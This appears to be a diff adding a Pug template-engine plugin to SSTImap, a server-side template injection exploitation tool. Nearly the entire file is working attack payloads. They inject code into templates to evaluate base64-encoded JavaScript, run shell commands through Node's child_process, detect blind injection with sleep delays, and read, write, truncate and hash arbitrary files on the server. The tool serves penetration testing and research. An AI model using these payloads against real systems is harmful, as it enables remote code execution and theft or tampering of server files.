@@ -1,0 +1,110 @@
+from plugins.languages import javascript
+from utils import rand
+
+
+class Pug(javascript.Javascript):
+    generic_plugin = True
+    priority = 5
+    plugin_info = {
+        "Description": """Pug template engine formerly known as Jade""",
+        "Authors": [
+            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
+            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
+        ],
+        "Engine": [
+            "Homepage: https://pugjs.org/",
+            "Github: https://github.com/pugjs/pug",
+        ],
+    }
+
+    def init(self):
+        self.update_actions({
+            'render': {
+                'call': 'inject',
+                'render': '{code}',
+                'header': '\n= {header[0]}+{header[1]}\n',
+                'trailer': '\n= {trailer[0]}+{trailer[1]}\n',
+                'test_render': f'|#{{typeof({rand.randints[0]})+{rand.randints[1]}}}',
+                'test_render_expected': f'number{rand.randints[1]}'
+            },
+            'render_error': {
+                'header': """\n= ''['x'][({header[0]}+{header[1]}).toString()+""",
+                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]\n""",
+            },
+            'evaluate': {
+                'evaluate': """= eval(Buffer('{code_b64p}', 'base64').toString())""",
+                'test_os': """global.process.mainModule.require('os').platform()"""
+            },
+            'evaluate_error': {
+                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())"""
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """0\n- x = [""]\n- x[0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]\n"""
+            },
+            'evaluate_blind': {
+                'call': 'inject',
+                'evaluate_blind': """0\n- eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')\n"""
+            },
+            'execute': {
+                'call': 'render',
+                'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
+            },
+            'execute_error': {
+                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
+            },
+            'execute_boolean': {
+                'call': 'evaluate_blind',
+                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
+                # TODO: use another function.
+                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
+            },
+            # Not using execute here since it's rendered and requires set headers and trailers
+            'execute_blind': {
+                'call': 'inject',
+                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
+                # TODO: use another function.
+                # Payloads calling inject must start with \n to break out already started lines
+                # It's two lines command to avoid false positive with Javascript module
+                'execute_blind': """\n- x = global.process.mainModule.require\n- x('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')\n"""
+            },
+            # No evaluate_blind here, since we've no sleep, we'll use inject
+            'write': {
+                'call': 'inject',
+                # Payloads calling inject must start with \n to break out already started lines
+                'write': """\n- global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')\n""",
+                'truncate': """\n- global.process.mainModule.require('fs').writeFileSync('{path}', '')\n"""
+            },
+            'read': {
+                'call': 'render',
+                'read': """= global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
+            },
+            'read_error': {
+                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
+            },
+            'md5': {
+                'call': 'render',
+                'md5': """= global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
+            },
+            'md5_error': {
+                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
+            },
+            'md5_blind': {
+                'call': 'evaluate_blind',
+                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
+                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
+            },
+        })
+
+        self.set_contexts([
+            # Text context, no closures
+            {'level': 0},
+            # Attribute close a(href=\'%s\')
+            {'level': 1, 'prefix': '{closure})', 'suffix': '//', 'closures': {1: javascript.ctx_closures[1]}},
+            # String interpolation #{
+            {'level': 2, 'prefix': '{closure}}}', 'suffix': '//', 'closures': javascript.ctx_closures},
+            # Code context
+            {'level': 2, 'prefix': '{closure}\n', 'suffix': '//', 'closures': javascript.ctx_closures},
+        ])
+
+    language = 'javascript'
